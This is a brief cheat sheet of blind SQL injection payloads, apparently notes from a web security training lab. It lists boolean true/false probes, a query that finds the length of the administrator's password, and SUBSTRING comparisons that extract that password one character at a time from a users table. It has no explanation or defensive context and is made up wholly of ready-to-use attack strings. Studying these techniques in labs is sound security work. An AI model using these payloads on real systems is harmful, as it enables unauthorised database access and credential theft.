# Blind SQLi

`' AND '1'='1`

`' AND '1'='2`

## Determine length

`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

## Determine characters

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`


`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a`
